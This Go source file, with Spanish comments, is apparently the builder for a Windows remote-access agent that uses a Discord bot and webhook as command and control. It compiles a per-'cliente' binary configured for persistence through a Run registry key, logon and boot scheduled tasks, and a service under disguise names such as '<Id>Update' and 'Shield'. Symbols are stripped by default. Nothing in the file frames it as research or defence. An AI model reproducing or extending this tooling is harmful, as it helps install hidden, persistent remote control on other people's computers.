//go:build windows

package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/local/govoid/internal/kit"
)

func main() {
	var opt kit.Options
	flag.StringVar(&opt.ID, "id", "", "token corto del cliente: mutex, servicio, tareas, rutas (obligatorio)")
	flag.StringVar(&opt.Name, "name", "", "nombre visible en panel y webhooks (obligatorio)")
	flag.StringVar(&opt.Token, "token", "", "token del bot de Discord (obligatorio)")
	flag.StringVar(&opt.Guild, "guild", "", "id de la guild donde vivirá el C2 (obligatorio)")
	flag.StringVar(&opt.Webhook, "webhook", "", "URL del webhook de avisos (obligatorio)")
	flag.StringVar(&opt.Category, "category", "", "id de categoría para los canales de sesión (opcional)")
	flag.StringVar(&opt.ChannelPrefix, "prefix", "sesion-", "prefijo de los canales de sesión")
	flag.StringVar(&opt.BinaryName, "binary", "", "nombre del ejecutable instalado (vacío = <id>.exe)")
	flag.StringVar(&opt.RunKey, "runkey", "", "nombre del valor Run (vacío = <Id>Update)")
	flag.StringVar(&opt.TaskLogon, "task-logon", "", "tarea de logon (vacío = <Id>Update)")
	flag.StringVar(&opt.TaskBoot, "task-boot", "", "tarea de arranque (vacío = <Id>UpdateBoot)")
	flag.StringVar(&opt.ServiceDisplay, "service-display", "", "nombre del servicio en services.msc")
	flag.StringVar(&opt.OutDir, "out", "", "carpeta de salida (vacío = dist/<Id>)")
	flag.StringVar(&opt.Repo, "repo", "", "raíz del código (vacío = carpeta del builder)")
	flag.BoolVar(&opt.KeepSymbols, "keep-symbols", false, "sin -s -w, para depurar")
	flag.BoolVar(&opt.ForceShared, "force-shared-token", false,
		"permite compilar con el token del agente local (dos agentes con el mismo token se expulsan)")
	flag.BoolVar(&opt.Package, "zip", false, "empaquetar binario, nota y hashes en un .zip")
	verifyOnly := flag.Bool("verify-only", false, "solo valida token, guild y webhook")
	flag.Parse()

	if err := run(opt, *verifyOnly); err != nil {
		fmt.Fprintf(os.Stderr, "\nerror: %v\n", err)
		os.Exit(1)
	}
}

func run(opt kit.Options, verifyOnly bool) error {
	if err := opt.Normalize(); err != nil {
		return err
	}

	printHeader(opt)

	ctx := context.Background()
	logf := kit.Logf(func(line string) { fmt.Println(line) })

	if _, err := opt.Check(ctx, logf); err != nil {
		return err
	}
	if warning, err := opt.GuardSharedToken(); err != nil {
		return err
	} else if warning != "" {
		fmt.Fprintf(os.Stderr, "  aviso      : %s\n", warning)
	}
	if verifyOnly {
		fmt.Println("\n-verify-only: nada compilado.")
		return nil
	}

	if _, err := kit.Build(ctx, opt, logf); err != nil {
		return err
	}

	fmt.Printf("\n%s\n", opt.OutDir)
	for _, name := range kit.SortedFiles(opt.OutDir) {
		if info, statErr := os.Stat(filepath.Join(opt.OutDir, name)); statErr == nil {
			fmt.Printf("  %-24s %d bytes\n", name, info.Size())
		}
	}
	return nil
}

func printHeader(o kit.Options) {
	fmt.Printf("cliente    : %s  (%s)\n", o.Name, o.ID)
	fmt.Printf("binario    : %s\n", o.BinaryName)
	fmt.Printf("servicio   : %sShield  ->  %s\n", o.ID, o.ServiceDisplay)
	fmt.Printf("tarea      : %sShieldGuard\n", o.ID)
	fmt.Printf("run key    : %s\n", o.RunKey)
	fmt.Printf("tareas     : %s / %s\n", o.TaskLogon, o.TaskBoot)
	fmt.Printf("guild      : %s\n", o.Guild)
	hook := o.Webhook
	if len(hook) > 58 {
		hook = hook[:58]
	}
	fmt.Printf("webhook    : %s...\n", hook)

	if names := kit.SortedFiles(o.OutDir); len(names) > 0 {
		fmt.Printf("salida     : %s\n", strings.Join(names[:min(len(names), 4)], ", "))
	}
}
